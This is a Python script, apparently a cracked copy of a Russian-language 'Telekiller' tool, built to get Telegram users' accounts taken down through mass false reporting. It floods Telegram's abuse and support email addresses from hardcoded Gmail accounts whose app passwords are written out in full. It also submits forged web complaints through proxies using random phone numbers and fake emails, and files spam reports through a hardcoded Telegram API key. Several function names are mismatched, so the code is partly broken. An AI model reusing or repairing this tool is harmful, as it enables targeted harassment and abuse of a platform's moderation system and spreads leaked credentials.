import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import random
import requests
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import ReportSpamRequest
from colorama import init, Fore
from faker import Faker
from faker.providers import phone_number

init(autoreset=True)

access_codes = ['@RigOlit']

senders = {'zlotema12@gmail.com': 'xxie yzkz wdyk ugxm',
'maybelox231@gmail.com': 'auov fern blju utwf',
'andeybirum@gmail.com': 'ouho uujv htlm rwaz',
'faverokstandof@gmail.com': 'nrsg kchi etta uuzh',
'faveroktt@gmail.com': 'dywo rgle jjwl hhbq',
'mksmksergeev@gmail.com': 'ycmw rqii rcbd isfd',
'maksimafanacefish@gmail.com': 'hdpn tbfp acwv jyro'}

receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org', 'ceo@telegram.org']

class UserAgent:
    def __init__(self):
        pass

    def random(self):
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

def print_menu():
    print(Fore.WHITE + '████████╗███████╗██╗░░░░░███████╗██╗░░██╗██╗██╗░░░░░██╗░░░░░███████╗██████╗░')
    print(Fore.WHITE + '╚══██╔══╝██╔════╝██║░░░░░██╔════╝██║░██╔╝██║██║░░░░░██║░░░░░██╔════╝██╔══██╗')
    print(Fore.WHITE + '░░░██║░░░█████╗░░██║░░░░░█████╗░░█████═╝░██║██║░░░░░██║░░░░░█████╗░░██████╔╝')
    print(Fore.WHITE + '░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██╔═██╗░██║██║░░░░░██║░░░░░██╔══╝░░██╔══██╗')
    print(Fore.WHITE + '░░░██║░░░███████╗███████╗███████╗██║░╚██╗██║███████╗███████╗███████╗██║░░██║')
    print(Fore.WHITE + '░░░╚═╝░░░╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝')
    print(Fore.WHITE + 'CRACK BY: @loggerspy                     MERGED INTO: https://t.me/Rigolit22')
    print(Fore.LIGHTCYAN_EX + "        • Program created")
    print(Fore.LIGHTCYAN_EX + "        • By @edelweissadpt")
    print(Fore.LIGHTRED_EX + "")
    print(Fore.LIGHTCYAN_EX + "   Меню")
    print(Fore.LIGHTCYAN_EX + "   1. Снос через mail & web " + Fore.LIGHTCYAN_EX + "[Status: " + Fore.LIGHTGREEN_EX + "Work" + Fore.LIGHTCYAN_EX + "]")
    print(Fore.LIGHTCYAN_EX + "   2. Снос через Botnet " + Fore.LIGHTCYAN_EX + "[Status: " + Fore.LIGHTGREEN_EX + "NEW" + Fore.LIGHTCYAN_EX + "]")
    print(Fore.LIGHTCYAN_EX + "   4. Перезапуск програмы")

def handle_email(receivers, senders):
  subject = input(Fore.LIGHTCYAN_EX + "   Введите тему: " + Fore.RESET)
  body = input(Fore.LIGHTCYAN_EX + "   Введите текст: " + Fore.RESET)                                                                                   
  for receiver in receivers:
    for sender_email, sender_password in senders.items():
      success = send_email(receiver, sender_email, sender_password, subject, body)
      if success:
        print(Fore.LIGHTGREEN_EX + f"Жалоба отправлена на почту Telegram")
        break
      else:
        print(Fore.LIGHTGREEN_EX + f"Жалоба отправлена на почту Telegram")

def handle_web_complaint():
    url = 'https://telegram.org/support'
    user_agent = UserAgent()

    text = input(Fore.LIGHTCYAN_EX+ "   Введите ID человека: " + Fore.RESET)
    count = int(input(Fore.LIGHTCYAN_EX + "   Введите количество аккаунтов для атаки (max. 900): " + Fore.RESET))

    def generate_russian_number():
        while True:
            number = f"+79{random.randint(100000000, 999999999)}"
            if len(number) == 12:
                return number

    contact = [generate_russian_number() for _ in range(5000)]

    for _ in range(count):
        chosen_contact = random.choice(contact)
        send_web_complaint(url, text, chosen_contact, user_agent)
        time.sleep(0.001)

def handlesessioncomplaint():
    APIID = '22622166'
    APIHASH = 'e4de2de0112314c46f74e98f4d050407'

    def sendtelegramcomplaint(channelusername, text):
        with TelegramClient('session', APIID, APIHASH) as client:
            client.sendmessage(channelusername, text)
            client(ReportSpamRequest(channelusername))

    channelusername = input(Fore.LIGHTCYANEX + "   Введите тег человека: " + Fore.RESET)
    text = input(Fore.LIGHTCYANEX + "   Введите текст жалобы: " + Fore.RESET)

    sendtelegramcomplaint(channelusername, text)
    print(Fore.LIGHTCYANEX + "Жалоба успешно отправлена!")

def sendemail(receiver, senderemail, senderpassword, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = senderemail
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(senderemail, senderpassword)
        server.sendmail(senderemail, receiver, msg.asstring())
        server.quit()
        return True
    except Exception as e:
        print(f"Ошибка при отправке с {senderemail}: {e}")
        return False

def send_web_complaint(url, text, contact, user_agent):
    headers = {
        'User-Agent': user_agent.random()
    }

    phone = "+79" + str(random.randint(100000000, 999999999))

    email = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(3)) + "_telekiller@gmail.com"

    payload = {
        'message': text,
        'email': email,
        'phone': phone,
        'setln': 'en'
    }

    proxies = {
    'http': '35.185.196.38:3128',
    'http': '199.167.236.12:3128',
    'http': '178.48.68.61:18080',
    'http': '189.240.60.166:909',
    'http': '103.247.21.235:8080', #это ворк проксю но их мало
    }

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxies)
        if response.status_code == 200:
            print(Fore.WHITE + f"<TK> Жалоба успешно отправлена! С аккаунта с номером: {phone}")
        else:
            print(Fore.LIGHTRED_EX + "Произошла ошибка при отправке жалобы")
    except Exception as e:
        print(Fore.YELLOW + f"Что-то пошло не так: {e}")

def check_access_code():
    user_input = input(Fore.YELLOW + "Введите код доступа: " + Fore.RESET)
    if user_input in access_codes:
        print("\033c", end="")
        print(Fore.LIGHTGREEN_EX + "Код доступа верный. Программа запущена.")
        return True
    else:
        print(Fore.LIGHTRED_EX + "Неверный код доступа. Программа завершает работу.")
        return False

def main():
    if check_access_code():
        while True:
            print_menu()
            choice = input(Fore.LIGHTCYAN_EX + "   Введите ваш выбор: " + Fore.RESET)

            if choice == "1":
                handle_email(receivers, senders)
            elif choice == "2":
                handle_web_complaint()
            elif choice == "3":
                handlesessioncomplaint()
            elif choice == "4":
                pass
            else:
                print(Fore.LIGHTRED_EX + "Неверный выбор. Пожалуйста, введите правильную опцию.")
            input(Fore.LIGHTCYAN_EX + "Нажмите Enter для продолжения...")
            print("\033c", end="")

if __name__ == "__main__":
    main()
